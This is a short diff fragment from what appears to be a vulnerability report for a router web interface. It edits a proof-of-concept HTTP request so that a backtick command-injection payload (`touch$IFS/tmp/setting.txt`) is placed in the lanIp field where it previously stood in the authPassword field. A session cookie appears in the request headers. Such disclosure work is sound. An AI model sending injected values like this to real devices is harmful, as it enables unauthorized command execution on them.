@@ -64,7 +64,7 @@ Accept-Encoding: gzip, deflate, br
 Cookie: isLogin=true; isLogin=true; sysauth=ca14c877a3df6cdc740bf4bbef3f02c1; sysauth=; repeatTimes=0; isLogin=true
 Connection: keep-alive
  
-authPassword=1`touch$IFS/tmp/setting.txt`
+lanIp=1`touch$IFS/tmp/setting.txt`
 ```
 
 #### Execution Steps:
